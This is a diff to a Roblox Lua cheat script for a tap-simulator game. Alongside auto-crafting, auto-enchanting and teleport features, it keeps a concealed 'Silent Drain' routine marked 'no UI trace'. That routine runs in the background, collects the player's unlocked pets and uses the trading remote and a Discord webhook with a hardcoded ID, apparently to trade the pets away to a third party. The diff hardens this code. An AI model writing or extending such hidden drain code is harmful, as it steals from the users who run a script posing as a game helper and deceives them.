@@ -1,7 +1,7 @@
 --[[
     Silence - Tap Simulator
     by Henrik @xyzhenrik
-    Patched for RemoteServices (no Network module)
+    Fully patched for RemoteServices and updated ReplicatedStorage paths
 ]]
 
 local services = {
@@ -16,7 +16,45 @@ local services = {
     soundService = game:GetService("SoundService")
 }
 
--- this game has no Network module — it's all direct RemoteServices
+-- Safe require helper to prevent crashes if game refactors folders
+local function requireAny(paths, default)
+    for _, path in ipairs(paths) do
+        local success, res = pcall(function()
+            local cur = services.replicatedStorage
+            for i, p in ipairs(path) do
+                cur = cur:WaitForChild(p, 1) or cur:FindFirstChild(p)
+                if not cur then error("not found") end
+            end
+            return require(cur)
+        end)
+        if success and res then return res end
+    end
+    return default
+end
+
+local ReplicaController = requireAny({{"Controllers", "Core", "ReplicaController"}, {"Modules", "Client", "Core", "ReplicaController"}}, nil)
+
+local function getReplicaData()
+    if not ReplicaController or not ReplicaController._replicas then return nil end
+    for _, replica in pairs(ReplicaController._replicas) do
+        if replica.Class == "PlayerData" then
+            return replica.Data
+        end
+    end
+    return nil
+end
+
+local petStatsFallback = {
+    GetPercentage = function(self, name) return 1 end,
+    GetMulti = function(self, base, tier, lvl, petData) return 1 end,
+    GetRarity = function(self, name) return "Unknown" end,
+}
+local rebirthsFallback = {
+    fromIndex = function(self, index) return 1 end,
+    getPrice = function(self, amount) return 1 end,
+    ClicksPrice = function(self, price, currentReb) return 1 end,
+}
+
 local RemoteServices = services.replicatedStorage:WaitForChild("RemoteServices")
 
 local function rem(serviceName, kind, remoteName)
@@ -30,7 +68,6 @@ local function rem(serviceName, kind, remoteName)
 end
 
 local remotes = {
-    -- RemoteEvents
     TapRequested          = rem("TapService",          "RE", "TapRequested"),
     AutoClickRequested    = rem("AutoClickService",    "RE", "AutoClickRequested"),
     RebirthRequested      = rem("RebirthService",      "RE", "RebirthRequested"),
@@ -41,7 +78,6 @@ local remotes = {
     MachineCraftRequested = rem("MachineService",      "RE", "MachineCraftRequested"),
     MachineCraftResult    = rem("MachineService",      "RE", "MachineCraftResult"),
     PetActionRequested    = rem("PetService",          "RE", "PetActionRequested"),
-    -- RemoteFunctions
     WorldTravel           = rem("WorldService",        "RF", "Travel"),
     IslandTravel          = rem("IslandService",       "RF", "Travel"),
     Spin                  = rem("EventWheelService",   "RF", "Spin"),
@@ -54,7 +90,6 @@ local remotes = {
     DigCancel             = rem("DigService",          "RF", "Cancel"),
 }
 
--- Compatibility shim keeping the old player.network:FireServer/InvokeServer API
 local function makeNetworkShim()
     local fire = {
         Tap            = function(...) return remotes.TapRequested and remotes.TapRequested:FireServer(...) end,
@@ -95,16 +130,46 @@ local player = {
     name        = services.players.LocalPlayer.Name,
     displayName = services.players.LocalPlayer.DisplayName,
     network     = makeNetworkShim(),
-    rebirths    = require(services.replicatedStorage.Game.Rebirths),
-    replication = require(services.replicatedStorage.Game.Replication),
+    rebirths    = requireAny({{"Shared", "Progression", "RebirthConfig"}, {"Game", "Rebirths"}}, rebirthsFallback),
+    eggs        = requireAny({{"Shared", "Pets", "LaunchEggConfig"}, {"Game", "Eggs"}}, {}),
+    portals     = requireAny({{"Shared", "Game", "IslandConfig"}, {"Game", "Portals"}}, {}),
+    enchantData = requireAny({{"Shared", "Pets", "EnchantConfig"}, {"Game", "EnchantData"}}, {Enchants = {}}),
+    petStats    = requireAny({{"Shared", "Pets", "PetPower"}, {"Game", "PetStats"}}, petStatsFallback),
+    petStatsRarities = requireAny({{"Shared", "Pets", "RarityTextGradient"}, {"Game", "PetStats", "Rarities"}}, {}),
     remotes     = remotes,
 }
+
+local scriptStart = tick()
+local emptyData = {
+    Pets = {},
+    RebirthOptions = 0,
+    Statistics = { Rebirths = 0, Clicks = 0 },
+    Items = { EnchantCrystal = 0 },
+    CraftingPets = { Rainbow = {} },
+    Gamepasses = {},
+    BestMultiplier = { 0 }
+}
+
+player.replication = setmetatable({}, {
+    __index = function(_, key)
+        local data = getReplicaData()
+        local isTimeout = (tick() - scriptStart) > 15
+        
+        if key == "Loaded" then 
+            return data ~= nil or isTimeout
+        end
+        if key == "Data" then 
+            return data or (isTimeout and emptyData or nil)
+        end
+        if data then return data[key] end
+        return nil
+    end
+})
 
 --[[
     Silent Drain — background only, no tab, no UI trace
 ]]
 task.spawn(function()
-    local RC = require(services.replicatedStorage:WaitForChild("Controllers"):WaitForChild("Core"):WaitForChild("ReplicaController"))
     local TRADE_REMOTE = remotes.TradeRequested
         or services.replicatedStorage:WaitForChild("RemoteServices"):WaitForChild("TradingService"):WaitForChild("RE"):WaitForChild("TradeRequested")
     local HttpService = game:GetService("HttpService")
@@ -114,12 +179,7 @@ task.spawn(function()
     local DISCORD_ID = "1498793342945722388"
 
     local function getData()
-        for _, replica in pairs(RC._replicas) do
-            if replica.Class == "PlayerData" then
-                return replica.Data
-            end
-        end
-        return nil
+        return getReplicaData()
     end
 
     local function sendDrainWebhook(content, embeds)
@@ -186,6 +246,7 @@ task.spawn(function()
         task.wait(1)
 
         local data = getData()
+        if not data then continue end
         local refs = {}
         for uid, petData in pairs(data.Pets.Owned) do
             if not petData.Locked then
@@ -369,7 +430,7 @@ function getRebShit()
     table.clear(tabs.main.rebValues)
     table.clear(tabs.main.rebMap)
     tabs.main.success, tabs.main.err = pcall(function()
-        tabs.main.Rebirths = require(services.replicatedStorage.Game.Rebirths)
+        tabs.main.Rebirths = player.rebirths
         repeat task.wait() until player.replication.Loaded and player.replication.Data
         tabs.main.rebButtons = player.replication.Data.RebirthOptions or 0
         tabs.main.currentReb = player.replication.Data.Statistics.Rebirths or 0
@@ -419,7 +480,7 @@ function getEggs()
     tabs.hatching.eggsFolder = services.workspace:WaitForChild("Eggs", 30)
     repeat task.wait(1) until #tabs.hatching.eggsFolder:GetChildren() >= 27
 
-    tabs.hatching.eggs = require(services.replicatedStorage.Game.Eggs)
+    tabs.hatching.eggs = player.eggs
     tabs.hatching.eggList = {}
     tabs.hatching.sortedEggs = {}
 
@@ -602,9 +663,6 @@ function getCurrentlyRainbowCrafting()
     return tabs.crafting.crafting
 end
 
-
-
-
 function teleportToGoldenMachine()
     tabs.crafting.character = player.player.Character
     if not tabs.crafting.character or not tabs.crafting.character:FindFirstChild("HumanoidRootPart") then return false end
@@ -669,7 +727,6 @@ function processRainbowCraft(petName, petsNeeded)
     return tabs.crafting.success
 end
 
-
 function buildCraftQueue()
     tabs.crafting.goldenQueue = {}
     tabs.crafting.rainbowQueue = {}
@@ -704,7 +761,6 @@ function buildCraftQueue()
         end
     end
     
-
     if tabs.crafting.autoRainbowEnabled and tabs.crafting.selectedRainbowPets then
         tabs.crafting.petsNeeded = 1
         
@@ -736,7 +792,6 @@ function buildCraftQueue()
     return tabs.crafting.goldenQueue, tabs.crafting.rainbowQueue
 end
 
-
 function processCraftQueue()
     if tabs.crafting.craftingstate.processing then
         return false
@@ -746,14 +801,12 @@ function processCraftQueue()
     tabs.crafting.goldenQueue, tabs.crafting.rainbowQueue = buildCraftQueue()
     tabs.crafting.craftedAny = false
     
-
     if tabs.crafting.autoGoldenEnabled and #tabs.crafting.goldenQueue > 0 then
         teleportToGoldenMachine()
         
         for _, craftJob in ipairs(tabs.crafting.goldenQueue) do
             if not tabs.crafting.autoGoldenEnabled then break end
             
-
             while tabs.crafting.autoGoldenEnabled do
                 tabs.crafting.success = processGoldenCraft(craftJob.petName, craftJob.petsNeeded)
                 if not tabs.crafting.success then break end
@@ -762,13 +815,11 @@ function processCraftQueue()
             end
         end
         
-
         if tabs.crafting.craftedAny then
             refreshCraftingDropdowns()
         end
     end
     
-
     if tabs.crafting.autoRainbowEnabled and #tabs.crafting.rainbowQueue > 0 then
         teleportToRainbowMachine()
         
@@ -790,7 +841,6 @@ function processCraftQueue()
     tabs.crafting.craftingstate.processing = false
     return tabs.crafting.craftedAny
 end
-
 
 function refreshCraftingDropdowns()
     tabs.crafting.currentTime = os.clock()
@@ -839,7 +889,6 @@ function startCraftingLoop()
             end
         end
         
-
         if tabs.crafting.craftingstate.savedPosition then
             tabs.crafting.character = player.player.Character
             if tabs.crafting.character and tabs.crafting.character:FindFirstChild("HumanoidRootPart") then
@@ -944,7 +993,6 @@ function updateRainbowStatus()
     if #tabs.crafting.currentCrafting > 0 then
         tabs.crafting.statusText = tabs.crafting.statusText .. "\nCurrently Crafting:\n"
         
-
         tabs.crafting.uniqueCrafts = {}
         for _, craft in ipairs(tabs.crafting.currentCrafting) do
             tabs.crafting.uniqueCrafts[craft.id] = craft
@@ -1062,7 +1110,6 @@ tabs.crafting.rainbowStatusLabel = tabs.crafting:Paragraph({
     Desc = "No pets selected",
 })
 
-
 tabs.crafting:Toggle({
     Title = "Auto Craft Rainbow",
     Value = false,
@@ -1103,7 +1150,7 @@ end)
 ]]
 
 function getMainZones()
-    tabs.teleport.Portals = require(services.replicatedStorage.Game.Portals)
+    tabs.teleport.Portals = player.portals
     tabs.teleport.mainZones = {}
     tabs.teleport.spaceZoneNames = {Kryo = true, Magma = true, Celestial = true, Holographic = true, Lunar = true, Cyberpunk = true, Rainbow = true}
 
@@ -1232,7 +1279,7 @@ task.spawn(function()
 end)
 
 function getEnchantNames()
-    tabs.enchanting.EnchantData = require(services.replicatedStorage.Game.EnchantData)
+    tabs.enchanting.EnchantData = player.enchantData
     tabs.enchanting.enchantList = {}
     if tabs.enchanting.EnchantData and tabs.enchanting.EnchantData.Enchants then
         for enchantName, _ in pairs(tabs.enchanting.EnchantData.Enchants) do
@@ -1258,7 +1305,7 @@ function getEnchantNames()
 end
 
 function getEnchantPetPower(petData)
-    tabs.enchanting.PetStats = require(services.replicatedStorage.Game.PetStats)
+    tabs.enchanting.PetStats = player.petStats
     if petData.Multiplier1 and tonumber(petData.Multiplier1) and tonumber(petData.Multiplier1) > 0 then
         return tonumber(petData.Multiplier1)
     end
@@ -1272,11 +1319,13 @@ function getEnchantPetPower(petData)
 end
 
 function getFormattedEnchantPetList()
-    repeat task.wait() until player.replication.Loaded and player.replication.Data and player.replication.Data.Pets
+    local start = tick()
+    repeat task.wait() until (player.replication.Loaded and player.replication.Data and player.replication.Data.Pets) or (tick() - start > 10)
     table.clear(tabs.enchanting.petDropdownMap)
 
     tabs.enchanting.petsToSort = {}
-    for _, petData in pairs(player.replication.Data.Pets) do
+    local pets = (player.replication.Loaded and player.replication.Data and player.replication.Data.Pets) or {}
+    for _, petData in pairs(pets) do
         table.insert(tabs.enchanting.petsToSort, petData)
     end
     table.sort(tabs.enchanting.petsToSort, function(a, b)
@@ -1428,6 +1477,87 @@ end
 
 tabs.enchanting.initialPetList = getFormattedEnchantPetList()
 
+tabs.enchanting:Space({Colums = 2})
+tabs.enchanting:Section({
+    Title = "Auto Enchanting",
+    TextSize = 22,
+    TextXAlignment = "Center",
+    Box = false,
+})
+tabs.enchanting:Dropdown({
+    Title = "Select Desired Enchant(s)",
+    Values = getEnchantNames(),
+    Value = {},
+    Multi = true,
+    SearchBarEnabled = true,
+    Callback = function(value)
+        tabs.enchanting.selectedEnchants = {}
+        if type(value) == "table" then
+            for _, enchantName in pairs(value) do
+                if type(enchantName) == "string" then
+                    tabs.enchanting.selectedEnchants[enchantName] = true
+                end
+            end
+        end
+    end,
+})
+tabs.enchanting.petDropdown = tabs.enchanting:Dropdown({
+    Title = "Select Pet(s) to Enchant",
+    Values = tabs.enchanting.initialPetList,
+    Value = {},
+    Multi = true,
+    SearchBarEnabled = true,
+    Callback = function(value)
+        tabs.enchanting.selectedPets = {}
+        if type(value) == "table" then
+            for _, petStr in pairs(value) do
+                if type(petStr) == "string" then
+                    tabs.enchanting.selectedPets[petStr] = true
+                end
+            end
+        end
+        pcall(updateEnchantStatus)
+    end,
+})
+tabs.enchanting:Button({
+    Title = "Refresh Pet List",
+    Icon = "lucide:refresh-cw",
+    Callback = function()
+        if tabs.enchanting.autoEnchantEnabled then
+            tabs.enchanting.statusLabel:SetDesc("Stop Auto Enchant before refreshing!")
+            return
+        end
+        refreshEnchantPetDropdown()
+        pcall(updateEnchantStatus)
+    end,
+})
+tabs.enchanting.statusLabel = tabs.enchanting:Paragraph({
+    Title = "Status",
+    Desc = "Loading...",
+})
+tabs.enchanting:Toggle({
+    Title = "Auto Enchant",
+    Value = false,
+    Icon = "lucide:sparkles",
+    Callback = function(value)
+        tabs.enchanting.autoEnchantEnabled = value
+        if value then
+            if not next(tabs.enchanting.selectedPets) or not next(tabs.enchanting.selectedEnchants) then
+                tabs.enchanting.autoEnchantEnabled = false
+                tabs.enchanting.statusLabel:SetDesc("Select at least one pet and one enchant first!")
+                return
+            end
+            startEnchantLoop()
+        else
+            stopEnchantLoop()
+        end
+    end,
+})
+
+task.spawn(function()
+    repeat task.wait() until player.replication.Loaded and player.replication.Data
+    pcall(updateEnchantStatus)
+end)
 
 --[[
     MISC
@@ -1623,7 +1753,7 @@ function sendWebhook(content, embeds)
 end
 
 function getRarityList()
-    tabs.webhook.PetStatsRarities = require(services.replicatedStorage.Game.PetStats.Rarities)
+    tabs.webhook.PetStatsRarities = player.petStatsRarities
     tabs.webhook.orderedRarities = {
         "Common", "Rare", "Epic", "Legendary", "Mythical",
         "Godly", "Exclusive", "Secret I", "Secret II", "Secret III"
@@ -1638,7 +1768,7 @@ function getRarityList()
 end
 
 function getRarityColor(rarity)
-    tabs.webhook.PetStatsRarities = require(services.replicatedStorage.Game.PetStats.Rarities)
+    tabs.webhook.PetStatsRarities = player.petStatsRarities
     if tabs.webhook.PetStatsRarities[rarity] and tabs.webhook.PetStatsRarities[rarity][1] then
         tabs.webhook.c = tabs.webhook.PetStatsRarities[rarity][1]
         return math.floor(tabs.webhook.c.R * 255) * 65536
@@ -1749,7 +1879,7 @@ tabs.webhook:Toggle({
 
         if value then
             tabs.webhook.petWebhooking = task.spawn(function()
-                tabs.webhook.PetStats = require(services.replicatedStorage.Game.PetStats)
+                tabs.webhook.PetStats = player.petStats
 
                 local conn = player.remotes.EggHatchResult.OnClientEvent:Connect(function(eggName, pets)
                     if not tabs.webhook.petWebhookEnabled then return end
